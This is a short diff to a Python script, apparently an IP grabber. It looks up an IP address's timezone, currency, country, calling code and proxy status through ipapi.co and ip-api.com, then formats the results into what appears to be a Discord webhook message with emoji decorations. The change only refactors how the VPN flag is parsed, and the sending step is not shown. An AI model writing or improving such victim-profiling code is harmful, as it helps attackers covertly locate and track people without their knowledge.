@@ -7,7 +7,7 @@ timezone    =    get(f'https://ipapi.co/{ip}/timezone').text
 currency    =    get(f'https://ipapi.co/{ip}/currency').text
 country     =    get(f'https://ipapi.co/{ip}/country_name').text
 callcode    =    get(f"https://ipapi.co/{ip}/country_calling_code").text
-vpn         =    get('http://ip-api.com/json?fields=proxy').text
+vpn         =    get('http://ip-api.com/json?fields=proxy').text; vpn = json.loads(vpn); vpn = vpn['proxy']
 
 def 一(str):
     data = {
@@ -23,7 +23,7 @@ def 一(str):
     > <:rip:959916670946791474> # **TimeZone |  {timezone}**
     > <:rip:959916670946791474> # **Currency |  {currency}**
     > <:rip:959916670946791474> # **CallCode | {callcode}**
-    > <:rip:959916670946791474> # **VPN | {json.loads(vpn)['proxy']}**  
+    > <:rip:959916670946791474> # **VPN | {vpn}**  
     """,
     "username" : 
     (
